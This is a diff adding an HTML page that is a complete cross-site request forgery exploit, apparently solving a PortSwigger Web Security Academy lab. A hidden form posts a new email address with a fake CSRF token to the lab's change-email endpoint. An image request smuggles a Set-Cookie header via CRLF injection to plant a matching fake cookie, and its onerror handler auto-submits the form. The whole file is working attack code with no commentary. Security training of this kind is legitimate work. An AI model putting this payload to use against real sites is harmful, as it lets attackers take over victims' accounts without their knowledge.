@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+    <form method="POST" action="https://ac1f1f291e50336dc0d02e5000d20061.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="wiener@normal-user.net">
+        <input type="hidden" name="csrf" value="fake" />
+    </form>
+    <img src="https://ac1f1f291e50336dc0d02e5000d20061.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
+</body>
+</html>
